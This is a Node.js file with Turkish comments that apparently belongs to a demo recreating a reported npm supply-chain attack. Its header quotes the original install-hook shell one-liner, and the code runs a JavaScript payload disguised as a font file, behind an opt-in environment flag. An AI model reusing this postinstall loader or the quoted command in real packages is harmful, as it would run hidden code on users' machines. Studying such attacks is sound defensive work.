"use strict";

/**
 * run-stage1.js
 * -------------
 * package.json -> "postinstall" hook'unun çağırdığı ilk dosya.
 *
 * RAPORDAKİ KARŞILIĞI:
 *   %WINDIR%\System32\cmd.exe /d /c (command -v node >/dev/null 2>&1 && node ./public/fontawesome/fa-solid-400.woff2)
 *     || (where node >nul 2>&1 && node ./public/fontawesome/fa-solid-400.woff2) || echo ''
 *
 * Gerçek vakada bu tek satırlık shell komutu üç işletim sistemi ailesini de
 * (macOS/Linux'ta "command -v", Windows'ta "where") destekleyecek şekilde
 * yazılmıştı ve node bulunursa "font dosyası" kılığındaki JS payload'ı
 * çalıştırıyordu. Biz burada aynı iki adımı (varlık kontrolü + maskelenmiş
 * dosyayı çalıştırma) node'un kendi API'siyle, okunabilir şekilde yeniden
 * kuruyoruz.
 */

const path = require("path");
const config = require("./config");

function isDemoExplicitlyEnabled() {
  // Güvenlik tercihi: repo yanlışlıkla "npm install" ile incelenirken
  // (ör. bir kod incelemesi sırasında) demo zincirinin tetiklenmesini
  // istemiyoruz. Gerçek vakada böyle bir kilit yoktu -- kurban hiçbir
  // onay vermeden zincir otomatik başlıyordu. Bu fark bilinçlidir.
  return process.env[config.requiredEnvFlag] === "1";
}

function main() {
  if (!isDemoExplicitlyEnabled()) {
    console.log(
      `[demo] Stage-1 tetiklenmedi. Bilinçli olarak devre dışı bırakıldı.\n` +
        `[demo] Etkinleştirmek için: ${config.requiredEnvFlag}=1 npm install`
    );
    return;
  }

  console.log("[demo] postinstall tetiklendi -- rapordaki 'npm install' anına denk gelir.");

  // Rapordaki "command -v node / where node" kontrolünün eşleniği: burada
  // zaten npm/node içinde çalıştığımız için var olduğunu biliyoruz, ama
  // orijinal tekniği göstermek için process.execPath üzerinden doğruluyoruz.
  const nodeAvailable = Boolean(process.execPath);
  if (!nodeAvailable) {
    // Orijinal komuttaki "|| echo ''" dalı: node yoksa sessizce hiçbir şey yapma.
    return;
  }

  // "Font dosyası" kılığındaki gerçek payload'ı çalıştırıyoruz.
  const stage1Path = path.join(__dirname, "..", "public", "fontawesome", "fa-solid-400.woff2");
  require(stage1Path);
}

main();
